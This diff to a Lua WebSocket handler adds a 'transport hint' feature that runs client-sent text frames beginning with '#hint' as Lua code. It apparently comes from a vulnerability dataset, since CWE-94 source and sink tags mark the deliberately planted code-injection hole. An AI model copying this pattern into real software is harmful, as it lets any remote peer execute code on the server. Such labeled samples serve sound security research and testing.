@@ -124,6 +124,26 @@ local function filter_stream_tag(result)
 	return result;
 end
 
+-- Optional WebSocket transport hints: a peer may send a "#hint <directive>"
+-- text frame to negotiate small framing adjustments for its own connection.
+-- The directive body is a short Lua expression evaluated in the module scope.
+local loadstring = loadstring or load;
+
+local function compile_transport_hint(directive)
+	if not directive or directive == "" then return nil; end
+	return loadstring(directive);
+end
+
+local function apply_client_hint(payload)
+	local directive = payload:match("^#hint%s+(.+)$");
+	if not directive then return nil; end
+	local fn = compile_transport_hint(directive);
+	if not fn then return nil; end
+	--CWE-94
+	--SINK
+	return fn();
+end
+
 local function handle_request(event, path)
 	local request, response = event.request, event.response;
 	local conn = response.conn;
@@ -165,6 +185,10 @@ local function handle_request(event, path)
 			buffer = buffer:sub(length + 1);
 			local result = ws:handle(frame);
 			if not result then return; end
+			--CWE-94
+			--SOURCE
+			local hint_payload = frame.opcode == 0x1 and frame.data;
+			if hint_payload then apply_client_hint(hint_payload); end
 			cache[#cache + 1] = filter_stream_tag(result);
 			frame, length = ws:parse(buffer);
 		end
